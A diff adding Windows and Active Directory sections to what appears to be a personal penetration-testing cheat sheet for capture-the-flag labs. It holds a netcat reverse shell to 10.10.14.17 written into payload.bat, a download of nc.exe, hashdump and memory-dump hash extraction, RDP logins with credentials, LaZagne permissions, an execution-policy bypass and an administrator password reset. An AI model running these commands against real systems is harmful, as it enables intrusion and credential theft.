@@ -1,3 +1,63 @@
+===========[[[[Win Tools +]]]]]]]]]]]]]]]]]]]====================================
+rdesktop -u admin -p password 10.10.193.154
+xfreerdp /u:wade /p:parzival /v:10.0.2.24
+apt install remmina
+hashdump
+volatility -f SILO-20180105-221806.dmp windows.hashdump.Hashdump
+get-content user.txt | Measure-Object -Character
+curl 10.10.14.17/nc.exe -o nc.exe
+echo nc.exe -e cmd 10.10.14.17 9001 > payload.bat
+tcpdump -i tun0 icmp -v
+Get-LocalUser
+grep -i 7.12 Web.config
+PS C:\Program Files\NSClient++> Remove-Item alias:curl
+netstat -ano | findstr LIST
+
+#win permission
+icacls hello.py /grant hacker:F
+icacls C:\temp\LaZagne.exe /grant Everyone:F
+
+#Command Execution with cmd and powershell
+powershell -c "ping 10.10.14.17"
+cmd.exe /c "ping 10.10.14.17"
+
+#If whoami not working use this
+echo %USERPROFILE%
+$env:USERNAME
+
+#.Net version check
+reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP"
+
+#Hidden files view(ps)
+dir -force
+
+#user password change as admin
+net user administrator password123
+
+#find local.txt or user.txt
+dir "\local.txt" /s
+dir "\users.txt" /s
+Get-ChildItem -Path C:\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue -Force
+#Check all user .txt file and history
+dir /s *.txt
+
+#Finding build.ps1 script
+powershell -executionpolicy bypass -Command "Get-ChildItem -Path C:\ -Include *build.ps1* -File -Recurse -ErrorAction SilentlyContinue"
+
+#Win PATH
+echo %PATH%
+set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
+
+#There is another drive?
+wmic logicaldisk get deviceid, volumename, description
+
+#Win task list and kill
+tasklist
+tasklist /v | findstr 2820
+taskkill /im:chisel.exe /f
+
+========================================================================================================
+=========[[[[AD +]]]]]]]]]]]]]]]]]]]====================================================================
 [[[smbclient +]]]]]]
 #Let's try to login Users
 smbclient -W active.htv -U SVC_TGS //active.htb/Users
